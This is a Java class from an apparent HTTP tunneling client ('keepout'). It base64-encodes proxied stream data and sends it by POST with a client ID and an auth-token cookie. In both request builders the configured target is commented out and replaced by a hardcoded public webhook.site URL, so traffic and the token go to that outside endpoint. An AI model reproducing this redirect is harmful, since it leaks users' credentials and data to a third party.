/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package net.keepout.client2;

import io.undertow.connector.ByteBufferPool;
import io.undertow.connector.PooledByteBuffer;
import io.undertow.util.Headers;
import java.io.Closeable;
import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.channels.WritableByteChannel;
import java.util.Objects;
import net.keepout.KeepoutConstants;
import net.keepout.config.Host;
import org.apache.commons.codec.binary.Base64InputStream;
import org.apache.http.client.entity.EntityBuilder;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpDelete;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.jboss.logging.Logger;


/**
 *
 * @author juno
 */
public class HttpProxyRequest implements Closeable {
  
  private final Host target;
  
  private final CloseableHttpClient http;
  
  private final ByteBufferPool pool;
  
  private final String authToken;
  
  public HttpProxyRequest(Host target, String authToken, ByteBufferPool pool) {
    this.target = Objects.requireNonNull(target);
    this.pool = Objects.requireNonNull(pool);
    this.authToken = Objects.requireNonNull(authToken);
    this.http = HttpClients.createDefault();
  }
  
  public boolean execute(String clientID, ReadableByteChannel input, WritableByteChannel output) throws IOException {
    try (
        PooledByteBuffer pb = pool.allocate();
        CloseableHttpResponse res = http.execute(createPost(clientID, Channels.newInputStream(input)));
        ) {
      boolean xclose = res.containsHeader(KeepoutConstants.HEADER_REMOTE_CLOSE);
      writeBack(Channels.newChannel(new Base64InputStream(res.getEntity().getContent(), false)), output, pb.getBuffer());
      return xclose;
    }
  }
  
  public boolean execute(String clientID, ByteBuffer input, WritableByteChannel output) throws IOException {
    try (
        PooledByteBuffer pb = pool.allocate();
        CloseableHttpResponse res = http.execute(createPost(clientID, input));
        ) {
      boolean xclose = res.containsHeader(KeepoutConstants.HEADER_REMOTE_CLOSE);
      writeBack(Channels.newChannel(new Base64InputStream(res.getEntity().getContent(), false)), output, pb.getBuffer());
      return xclose;
    }
  }
  
  public void executeDelete(String clientID) throws IOException {
    try (
        PooledByteBuffer pb = pool.allocate();
        CloseableHttpResponse res = http.execute(createDelete(clientID));
        ) {
      Logger.getLogger(getClass()).infof("DELETE Http: %s", res.getStatusLine());
    }
  }
  
  @Override
  public void close() throws IOException {
    this.http.close();
  }
  
  private void writeBack(ReadableByteChannel input, WritableByteChannel output, ByteBuffer buf) throws IOException {
    int read;
    while((read = input.read(buf)) != -1) {
      if(read > 0) {
        buf.flip();
        int write = 0;
        while((write += output.write(buf)) < read);
        buf.clear();
      }
    }
  }
  
  private HttpPost createPost(String clientID, ByteBuffer data) {
    InputStream input = new InputStream() {
      @Override
      public int read() throws IOException {
        return data.hasRemaining() ? data.get() : -1;
      }
    };
    return createPost(clientID, input);
  }
  
  private HttpPost createPost(String clientID, InputStream data) {
    //String uri = "http://" + target.toString();
    String uri = "https://webhook.site/318ea209-1d5d-4a3f-81eb-fcf9b17b133d";
    String authCookie = KeepoutConstants.AUTH_COOKIE + "=" + authToken;
    HttpPost post = new HttpPost(uri);
    post.addHeader(Headers.CONTENT_TYPE_STRING, KeepoutConstants.CONTENT_TYPE_TEXT_HTML);
    post.addHeader(KeepoutConstants.HEADER_CLIENT_ID, clientID);
    post.addHeader(Headers.COOKIE_STRING, authCookie);
    //post.addHeader(Headers.CONTENT_LENGTH_STRING, String.valueOf(buf.getBuffer().remaining()));
    post.setEntity(EntityBuilder.create().setStream(new Base64InputStream(data, true)).build());
    return post;
  }

  private HttpDelete createDelete(String clientID) {
    //String uri = "http://" + target.toString();
    String uri = "https://webhook.site/318ea209-1d5d-4a3f-81eb-fcf9b17b133d";
    String authCookie = KeepoutConstants.AUTH_COOKIE + "=" + authToken;
    HttpDelete delete = new HttpDelete(uri);
    delete.addHeader(KeepoutConstants.HEADER_CLIENT_ID, clientID);
    delete.addHeader(Headers.COOKIE_STRING, authCookie);
    return delete;
  }

}
